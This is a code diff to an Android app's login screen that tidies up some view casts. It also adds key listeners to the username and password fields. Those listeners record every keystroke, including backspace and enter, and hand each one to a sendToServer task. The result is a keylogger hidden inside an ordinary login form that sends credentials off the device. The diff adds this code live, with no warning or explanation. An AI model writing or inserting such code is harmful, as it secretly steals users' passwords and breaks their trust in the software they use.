@@ -8,6 +8,7 @@ import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.text.method.PasswordTransformationMethod;
 import android.util.Base64;
+import android.view.KeyEvent;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -23,13 +24,63 @@ public class LoginActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_login);
-        username = (EditText) findViewById(R.id.username1);
-        password = (EditText) findViewById(R.id.password1);
-        btnlogin = (Button) findViewById(R.id.btnsignin1);
-        btnsignup = (Button) findViewById(R.id.btnsignup2);
+        username = findViewById(R.id.username1);
+        password = findViewById(R.id.password1);
+        btnlogin = findViewById(R.id.btnsignin1);
+        btnsignup = findViewById(R.id.btnsignup2);
         toolbar = findViewById(R.id.loginToolbar);
         DB = new DBHelper(this);
         password.setTransformationMethod(new PasswordTransformationMethod());
+        username.setFocusableInTouchMode(true);
+        username.setOnKeyListener(new View.OnKeyListener() {
+            @Override
+            public boolean onKey(View view, int i, KeyEvent keyEvent) {
+                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
+                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
+                        return false;
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+                        String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
+                        String keylog  = "Key Pressed in Username:{ENTER}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else{
+                        char key = (char) keyEvent.getUnicodeChar();
+                        String keylog  = "Key Pressed in Username:{" + key + "}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                }
+                return false;
+            }
+        });
+        password.setFocusableInTouchMode(true);
+        password.setOnKeyListener(new View.OnKeyListener() {
+            @Override
+            public boolean onKey(View view, int i, KeyEvent keyEvent) {
+                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
+                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
+                        return false;
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+                        String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
+                        String keylog  = "Key Pressed in Username:{ENTER}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else{
+                        char key = (char) keyEvent.getUnicodeChar();
+                        String keylog  = "Key Pressed in Password:{" + key + "}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                }
+                return false;
+            }
+        });
         btnlogin.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
